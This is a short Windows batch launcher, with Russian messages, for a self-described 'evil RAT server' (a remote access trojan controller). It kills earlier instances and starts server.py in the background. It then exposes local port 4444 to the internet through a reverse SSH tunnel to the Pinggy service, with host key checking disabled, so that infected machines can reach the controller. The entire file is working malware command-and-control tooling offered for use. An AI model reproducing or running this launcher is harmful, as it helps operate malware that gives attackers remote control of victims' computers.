@echo off
chcp 65001 >nul
title ЗЛОЙ RAT SERVER - Windows Edition

echo ==================================================
echo     ЗЛОЙ RAT SERVER LAUNCHER (Windows)
echo ==================================================
echo.

taskkill /F /IM python.exe /FI "WINDOWTITLE eq *server.py*" >nul 2>&1
taskkill /F /IM ssh.exe >nul 2>&1

echo [+] Запускаем сервер ратки...
start /B python server.py > server.log 2>&1

timeout /t 3 >nul

echo [+] Сервер запущен.
echo.
echo [+] Запускаем Pinggy туннель...
echo НЕ ЗАКРЫВАЙ ЭТО ОКНО!
echo.
echo Команда: ssh -p 443 -R0:127.0.0.1:4444 tcp@a.pinggy.io
echo.

ssh -p 443 -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R0:127.0.0.1:4444 tcp@a.pinggy.io

echo.
echo [-] Туннель упал.
pause
